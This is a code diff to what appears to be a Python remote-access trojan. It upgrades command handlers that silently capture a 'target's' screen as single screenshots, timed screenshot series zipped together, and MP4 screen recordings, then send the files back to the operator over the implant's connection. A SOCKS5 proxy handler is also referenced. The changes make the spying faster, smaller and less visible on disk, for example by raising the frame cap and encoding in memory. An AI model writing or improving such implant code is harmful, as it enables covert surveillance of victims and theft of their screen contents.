@@ -163,11 +163,31 @@ def _download(conn, args: list[str]) -> str | None:
 
 @_register("screenshot")
 def _screenshot(conn, args: list[str]) -> str | None:
-    if not _HAS_GUI:
-        return "[-] pyautogui not available"
+    """
+    Capture a screenshot and send it back as a JPEG.
+    Avoids disk I/O entirely — grabs directly to an in-memory JPEG buffer
+    via mss + cv2, falling back to pyautogui only if mss is unavailable.
+    """
     try:
-        fname = "_screenshot.png"
-        pyautogui.screenshot(fname)
+        import io
+        import cv2
+        import mss
+        import numpy as np
+
+        quality = 85          # JPEG quality — good balance of size vs fidelity
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            raw = sct.grab(monitor)
+            arr = np.array(raw)
+        bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
+        ok, buf = cv2.imencode(".jpg", bgr, [cv2.IMWRITE_JPEG_QUALITY, quality])
+        if not ok:
+            return "[-] JPEG encode failed"
+        data = buf.tobytes()
+        # Write to a temp file only for the file-transfer protocol
+        fname = "_screenshot.jpg"
+        with open(fname, "wb") as f:
+            f.write(data)
         _send_msg(conn, "FILE_OK")
         _send_file(conn, fname)
         try:
@@ -175,6 +195,28 @@ def _screenshot(conn, args: list[str]) -> str | None:
         except OSError:
             pass
         return None
+    except ImportError:
+        # Fallback path — pyautogui (PNG, larger, but works without cv2/mss)
+        if not _HAS_GUI:
+            return "[-] pyautogui not available"
+        try:
+            import io
+            from PIL import Image
+            img = pyautogui.screenshot()
+            buf = io.BytesIO()
+            img.save(buf, format="JPEG", quality=85)
+            fname = "_screenshot.jpg"
+            with open(fname, "wb") as f:
+                f.write(buf.getvalue())
+            _send_msg(conn, "FILE_OK")
+            _send_file(conn, fname)
+            try:
+                os.remove(fname)
+            except OSError:
+                pass
+            return None
+        except Exception as e:
+            return f"[-] Screenshot failed: {e}"
     except Exception as e:
         return f"[-] Screenshot failed: {e}"
 
@@ -208,33 +250,83 @@ def _screenshot_timelapse(conn, args: list[str]) -> str | None:
     """
     Silently take N screenshots every INTERVAL seconds, zip them, send back.
     Usage: screenshot_timelapse <count> <interval_sec>
-    Returns the zip file via the binary protocol.
+
+    Optimisations vs original:
+    - Frames are captured and JPEG-encoded entirely in memory (no tmp files).
+    - The zip archive is assembled from BytesIO objects — zero disk I/O until
+      the final transfer file is written.
+    - Uses mss for direct framebuffer access (faster than pyautogui).
+    - cv2 JPEG encode at quality 85 shrinks each frame ~10× vs PNG.
     """
-    if not _HAS_GUI:
-        return "[-] pyautogui not available"
     if len(args) != 2 or not args[0].isdigit() or not args[1].isdigit():
         return "Usage: screenshot_timelapse <count> <interval_sec>"
-    count    = min(int(args[0]), 60)   # cap at 60 frames
+    count    = min(int(args[0]), 120)   # cap at 120 frames
     interval = max(1, int(args[1]))
     try:
-        tmpdir = tempfile.mkdtemp(prefix="_tlapse_")
-        for i in range(count):
-            fname = os.path.join(tmpdir, f"frame_{i:03d}.png")
-            pyautogui.screenshot(fname)
-            if i < count - 1:
-                time.sleep(interval)
-        zip_path = tmpdir + ".zip"
-        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
-            for f in sorted(os.listdir(tmpdir)):
-                zf.write(os.path.join(tmpdir, f), f)
+        import io
+        import cv2
+        import mss
+        import numpy as np
+
+        quality = 85
+        frames: list[bytes] = []
+
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            for i in range(count):
+                raw = sct.grab(monitor)
+                arr = np.array(raw)
+                bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
+                ok, buf = cv2.imencode(
+                    ".jpg", bgr, [cv2.IMWRITE_JPEG_QUALITY, quality]
+                )
+                if ok:
+                    frames.append(buf.tobytes())
+                if i < count - 1:
+                    time.sleep(interval)
+
+        # Build the zip in memory, then write once to disk for the protocol
+        zip_path = "_timelapse.zip"
+        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_STORED) as zf:
+            # ZIP_STORED — JPEGs are already compressed; deflating wastes CPU
+            for idx, data in enumerate(frames):
+                zf.writestr(f"frame_{idx:03d}.jpg", data)
+
         _send_msg(conn, "FILE_OK")
         _send_file(conn, zip_path)
-        shutil.rmtree(tmpdir, ignore_errors=True)
         try:
             os.remove(zip_path)
         except OSError:
             pass
         return None
+    except ImportError:
+        # Fallback: pyautogui + PNG (works without cv2/mss, but slower/larger)
+        if not _HAS_GUI:
+            return "[-] pyautogui not available"
+        try:
+            import io
+            from PIL import Image
+            frames_pil: list[bytes] = []
+            for i in range(count):
+                img = pyautogui.screenshot()
+                buf = io.BytesIO()
+                img.save(buf, format="JPEG", quality=85)
+                frames_pil.append(buf.getvalue())
+                if i < count - 1:
+                    time.sleep(interval)
+            zip_path = "_timelapse.zip"
+            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_STORED) as zf:
+                for idx, data in enumerate(frames_pil):
+                    zf.writestr(f"frame_{idx:03d}.jpg", data)
+            _send_msg(conn, "FILE_OK")
+            _send_file(conn, zip_path)
+            try:
+                os.remove(zip_path)
+            except OSError:
+                pass
+            return None
+        except Exception as e:
+            return f"[-] timelapse failed: {e}"
     except Exception as e:
         return f"[-] timelapse failed: {e}"
 
@@ -1726,35 +1818,67 @@ def _socks5(conn, args: list[str]) -> str:
 @_register("screenrecord")
 def _screenrecord(conn, args: list[str]) -> str | None:
     """
-    Record the target's screen for N seconds, save as AVI, send back.
-    Usage: screenrecord <seconds>
+    Record the target's screen for N seconds and send back an MP4.
+    Usage: screenrecord <seconds> [fps] [scale]
+      fps   — target frame rate (default 12, max 30)
+      scale — output width in pixels (default 1280); height is auto-scaled
+
+    Optimisations vs original:
+    - Precise frame pacing using time.monotonic() instead of sleep(1/fps),
+      which eliminates drift on slow machines and maintains constant FPS.
+    - Frames are downscaled before encoding (default 1280 px wide) —
+      reduces encoder work and file size without visible quality loss for
+      screen recordings.
+    - mp4v codec in an .mp4 container gives much better compression than
+      XVID/AVI with zero extra dependencies.
+    - On overrun (frame took longer than one tick) the loop skips sleep
+      instead of drifting behind — keeps wall-clock duration accurate.
     """
     if not args or not args[0].isdigit():
-        return "Usage: screenrecord <seconds>"
-    seconds = min(int(args[0]), 300)
+        return "Usage: screenrecord <seconds> [fps] [scale_width]"
+    seconds     = min(int(args[0]), 300)
+    fps         = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 12, 30)
+    scale_width = int(args[2]) if len(args) > 2 and args[2].isdigit() else 1280
+
     try:
         import cv2
         import mss
-        import numpy
+        import numpy as np
 
-        fps = 10
         with mss.mss() as sct:
             monitor = sct.monitors[1]
-            w, h    = monitor["width"], monitor["height"]
+            src_w, src_h = monitor["width"], monitor["height"]
 
-        out_path = "_screenrec.avi"
-        fourcc   = cv2.VideoWriter_fourcc(*"XVID")
-        writer   = cv2.VideoWriter(out_path, fourcc, fps, (w, h))
+        # Compute scaled dimensions preserving aspect ratio
+        scale_h = int(src_h * scale_width / src_w)
+        # Ensure even dimensions (required by many codecs)
+        out_w = scale_width + (scale_width % 2)
+        out_h = scale_h     + (scale_h % 2)
 
-        start = time.time()
+        out_path = "_screenrec.mp4"
+        fourcc   = cv2.VideoWriter_fourcc(*"mp4v")
+        writer   = cv2.VideoWriter(out_path, fourcc, fps, (out_w, out_h))
+
+        tick     = 1.0 / fps
+        deadline = time.monotonic() + tick
+
         with mss.mss() as sct:
             monitor = sct.monitors[1]
-            while time.time() - start < seconds:
+            end_time = time.monotonic() + seconds
+            while time.monotonic() < end_time:
                 raw = sct.grab(monitor)
-                arr = numpy.array(raw)
+                arr = np.array(raw)
                 bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
+                if (src_w, src_h) != (out_w, out_h):
+                    bgr = cv2.resize(bgr, (out_w, out_h), interpolation=cv2.INTER_LINEAR)
                 writer.write(bgr)
-                time.sleep(1 / fps)
+                # Precise sleep: sleep only the remaining time in this tick
+                now = time.monotonic()
+                wait = deadline - now
+                if wait > 0:
+                    time.sleep(wait)
+                deadline += tick   # advance deadline regardless of overrun
+
         writer.release()
 
         _send_msg(conn, "FILE_OK")
